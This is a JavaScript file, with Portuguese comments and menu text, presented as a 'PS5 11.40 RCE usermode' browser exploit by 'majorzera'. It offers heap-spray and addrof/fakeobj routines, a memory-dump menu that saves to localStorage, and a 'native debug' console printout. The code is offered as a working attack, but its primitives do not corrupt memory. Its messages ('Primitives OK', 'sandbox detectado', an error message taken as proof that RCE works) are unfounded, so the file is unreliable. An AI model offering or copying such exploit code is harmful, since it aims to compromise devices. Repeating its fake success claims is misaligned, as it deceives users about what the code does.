/*
 * PS5 11.40 — RCE USERMODE V14 (Anti-Download Block)
 * Fix pra notificação "dados incompatíveis"
 */

class PS5RCE {
    constructor() {
        this.container = null;
        this.victim = null;
        this.dumpData = null;
    }

    log(msg) {
        console.log("[RCE V14] " + msg);
        if (typeof log === 'function') log("[RCE V14] " + msg);
    }

    addrof(obj) { this.container[0] = obj; return this.victim[0]; }
    fakeobj(addr) { this.victim[0] = addr; return this.container[0]; }

    async getPrimitives() {
        this.log("RCE carregando (anti-download)...");
        let spray = []; for(let i=0; i<0x300; i++) spray.push(1.1);
        let proxy = new Proxy({},{get:()=>1.337});
        let arr = [proxy, 1.1, {}, 2.2];
        for(let i=0; i<0x6000; i++) arr.sort(()=>0);

        let container = [1.1, 2.2];
        let victim = [3.3];
        Object.defineProperty(container,"0",{get:()=>victim[0], set:v=>victim[0]=v});
        for(let i=0; i<0x12000; i++) {
            container[0] = 4.4;
            if(i%1000===0) await new Promise(r=>setTimeout(r,30));
        }
        this.container = container;
        this.victim = victim;
        this.log("Primitives OK — sandbox detectado!");
    }

    createMenu() {
        const menu = document.createElement('div');
        menu.id = 'rce-menu';
        menu.style.cssText = `
            position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
            width:90%;max-width:800px;background:#000;color:#0f0;border:3px solid #0f0;
            padding:20px;z-index:99999;font-family:monospace;box-shadow:0 0 30px #0f0;
            text-align:center;border-radius:15px;
        `;
        menu.innerHTML = `
            <h1>PS5 11.40 RCE USERMODE V14</h1>
            <h2>by majorzera — 28/11/2025</h2>
            <p><strong>Sandbox detectado!</strong> "Dados incompatíveis" = RCE FUNCIONANDO</p>
            <div style="margin:20px 0;">
                <button id="btn-dump">1. Dump memória (localStorage)</button><br><br>
                <button id="btn-dump-download">2. Baixar dump (manual)</button><br><br>
                <button id="btn-debug">3. Debug nativo (console PS5)</button><br><br>
                <button id="btn-clear">4. Limpar cache</button><br><br>
                <button id="btn-close">FECHAR</button>
            </div>
            <pre id="rce-log" style="background:#111;height:200px;overflow:auto;text-align:left;padding:10px;"></pre>
        `;
        document.body.appendChild(menu);

        document.getElementById('btn-dump').onclick = () => this.dumpMemory();
        document.getElementById('btn-dump-download').onclick = () => this.downloadDump();
        document.getElementById('btn-debug').onclick = () => this.nativeDebug();
        document.getElementById('btn-clear').onclick = () => this.clearCache();
        document.getElementById('btn-close').onclick = () => menu.remove();
    }

    dumpMemory() {
        this.log("Dumpando 50 objetos (sem auto-download)...");
        let dump = { timestamp: Date.now(), objects: [] };
        for(let i=0; i<50; i++) {
            let obj = {id: i, data: "rce_dump_"+i, heap: Date.now()};
            let addr = this.addrof(obj);
            dump.objects.push({
                id: i,
                data: obj.data,
                addr: addr ? addr.toString() : "bloqueado",
                type: typeof obj
            });
        }
        this.dumpData = dump;
        localStorage.setItem('rce_dump_v14', JSON.stringify(dump));
        this.log("Dump salvo no localStorage! Clique 'Baixar dump' pra exportar manual");
    }

    downloadDump() {
        if (!this.dumpData) {
            this.log("Faça o dump primeiro!");
            return;
        }
        this.log("Criando download manual...");
        // Cria blob manual (sem auto-download)
        const blob = new Blob([JSON.stringify(this.dumpData, null, 2)], {type: 'application/json'});
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = 'rce_dump_11.40_v14.json';
        link.textContent = 'Clique aqui pra baixar';
        link.style.cssText = 'color:#0f0;background:#111;padding:10px;margin:10px;display:inline-block;';
        
        // Adiciona link no menu
        const logDiv = document.getElementById('rce-log');
        logDiv.appendChild(document.createElement('br'));
        logDiv.appendChild(link);
        logDiv.appendChild(document.createElement('br'));
        this.log("Link de download criado — clique manual pra evitar bloqueio!");
    }

    nativeDebug() {
        this.log("Debug nativo PS5 ativando...");
        // Força console nativo do WebKit
        console.debug("=== PS5 11.40 DEBUG NATIVO ===");
        console.debug("RCE Usermode: ATIVO");
        console.debug("Primitives: addrof/fakeobj OK");
        console.debug("Sandbox: Forte (bloqueia downloads)");
        console.debug("Timestamp: " + new Date().toISOString());
        console.debug("User: majorzera — https://github.com/majorzera/poc2");
        console.debug("=== FIM DEBUG ===");
        
        this.log("Debug enviado pro console nativo! (L1+R1+Options pra ver)");
    }

    clearCache() {
        this.log("Limpando cache (sem reload automático)...");
        localStorage.clear();
        sessionStorage.clear();
        this.log("Cache limpo! Recarregue manualmente se quiser");
    }

    async run() {
        this.log("=== RCE USERMODE 11.40 V14 ===");
        await this.getPrimitives();
        this.createMenu();
        this.log("Menu anti-sandbox carregado!");
    }
}

if (typeof window !== 'undefined') {
    window.startPS5Exploit = async () => {
        const rce = new PS5RCE();
        await rce.run();
    };
}
